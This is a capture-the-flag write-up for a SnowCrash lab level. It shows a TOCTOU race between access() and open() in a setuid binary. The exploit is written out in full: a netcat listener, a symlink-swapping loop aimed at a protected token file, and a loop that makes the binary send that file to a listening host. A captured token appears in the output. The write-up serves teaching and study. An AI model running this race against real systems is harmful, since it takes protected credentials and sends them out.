# LEVEL09

## Analysis

## Enumerating

Once again enumerating the home directory displays two files, `level10` and `token`:
```bash
    level10@SnowCrash:~$ ls -la
    [...]
    -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
    -rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

Except this time, the binary can run with the token but does not give any conclusive hints on the vulnerability to expoit:
```bash
    level10@SnowCrash:~$ ./level10 token
    ./level10 file host
            sends file to host if you have access to it
```

## Investigation

We use `strings` to look for intersting printable strings that program:
```bash
    level10@SnowCrash:~$ strings level10
    [...]
    inet_addr
    open
    access
    strerror
    [...]
    %s file host
            sends file to host if you have access to it
    Connecting to %s:6969 .. 
    Unable to connect to host %s
    [...]
```

Now two relevant hints appear:

1. The program tries to open a file and control access rights with `access`.
2. The program is trying to send a file, connecting to 6969.

## Vulnerability

The vulnerability present in this program is called `TOCTOU (Time-of-Check to Time-of-Use) race condition exploit`. This creates a time window where the file can be modified between the check and the actual use.
The goal is to exploit the race window between `access()` and `open()`.

## Exploitation

N.B: The two scripts used in this eploitation can be found in the ressource directory. All scripts must run locally in /tmp where we have write access. Do not forget to change permission before running both scripts.

To put in place this exploitation, we need to open three terminals.

In the first terminal we run netcat to listen to the port the program tries to connect to:
```bash
    level10@SnowCrash:~$ nc -lk 6969
    # -l to specify netcat should listen on specified port, -k to stay listening after each connection.
```

In a second window we launch our first script `script.sh` in /tmp. this script continuously attempts to win the race window.
```bash
#!/bin/bash
while true; do
        touch /tmp/link
        rm -f /tmp/link
        ln -s /home/user/level10/token /tmp/link
        rm -f /tmp/link
done
```

The third script `spam.sh` is launched in a third terminal. This script will just keep trying to run the binary with the symlink and ip address as argument:
```bash
    #!/bin/bash
    while true; do
        /home/user/level10/level10 /tmp/link 192.168.186.130
    done
```

## Result 

```bash
    level10@SnowCrash:~$ nc -lk 6969
    .*( )*.
    [...]
    .*( )*.
    woupa2yuojeeaaed06riuj63c
    .*( )*.
    [...]
```
```bash
    level10@SnowCrash:~$ su flag10
    Password: 
    Don't forget to launch getflag !
    flag10@SnowCrash:~$ getflag
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Takeaways

- authorization check and resource usage must be atomic